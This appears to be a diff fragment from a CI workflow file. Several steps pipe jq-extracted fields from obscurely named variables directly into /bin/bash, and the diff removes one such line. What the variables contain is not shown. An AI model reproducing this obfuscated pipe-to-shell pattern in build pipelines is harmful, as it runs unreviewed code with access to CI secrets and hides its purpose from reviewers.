@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$gbikt521" | jq -r .xw43 | /bin/bash
           printf '%s' "$ciq3" | jq -r .sn43488 | /bin/bash
           echo $oj9 | jq -r .yw3 | /bin/bash
-          printf '%s' "$eh8" | jq -r .iqdn35 | /bin/bash
 
       - name: Save archive
         if: always()
